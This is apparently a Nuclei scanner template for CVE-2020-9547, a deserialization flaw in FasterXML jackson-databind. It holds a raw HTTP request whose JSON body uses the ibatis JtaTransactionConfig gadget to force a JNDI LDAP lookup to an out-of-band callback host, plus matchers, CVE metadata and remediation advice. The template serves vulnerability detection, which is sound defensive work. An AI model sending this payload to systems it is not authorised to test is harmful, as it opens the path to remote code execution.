http:
- matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol, 'dns')
    - contains_any(content_type, 'application/json', 'text/plain')
    - status_code == 200 || status_code == 400 || status_code == 500
    type: dsl
  - condition: or
    part: body
    type: word
    words:
    - JsonMappingException
    - InvalidTypeIdException
    - JdbcRowSetImpl
    - com.fasterxml.jackson.databind
    - javax.naming.NamingException
  matchers-condition: and
  raw:
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    ["com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig",{"properties":["java.util.Properties",{"UserTransaction":"{{payload_jndi_ldap}}"}]}]

    '
id: CVE-2020-9547
info:
  author: pranjalnegi
  classification:
    cpe: cpe:2.3:a:fasterxml:jackson-databind:*:*:*:*:*:*:*:*
    cve-id: CVE-2020-9547
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-502
    epss-percentile: 0.97354
    epss-score: 0.43143
  description: 'FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction
    between serialization gadgets and typing, related to com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig
    (aka ibatis-sqlmap). This vulnerability allows attackers to execute arbitrary
    code through deserialization of untrusted data when polymorphic type handling
    (@JsonTypeInfo with use=JsonTypeInfo.Id.CLASS) is enabled.

    '
  impact: 'Successful exploitation could allow an attacker to execute arbitrary code
    on the affected system through deserialization of malicious JSON payloads.

    '
  metadata:
    max-request: 1
    product: jackson-databind
    vendor: fasterxml
    verified: true
  name: FasterXML jackson-databind - Deserialization Remote Code Execution
  reference:
  - https://github.com/fairyming/CVE-2020-9547
  - https://github.com/FasterXML/jackson-databind/issues/2620
  - https://nvd.nist.gov/vuln/detail/CVE-2020-9547
  remediation: 'Update FasterXML jackson-databind to version 2.9.10.4 or later. Alternatively,
    disable polymorphic type handling or implement proper input validation and deserialization
    controls.

    '
  severity: critical
  tags: cve,cve2020,jackson,databind,deserialization,rce,vkev,vuln
variables:
  payload_jndi_ldap: ldap://{{interactsh-url}}/{{randstr}}
  randstr: '{{rand_text_alphanumeric(8)}}'
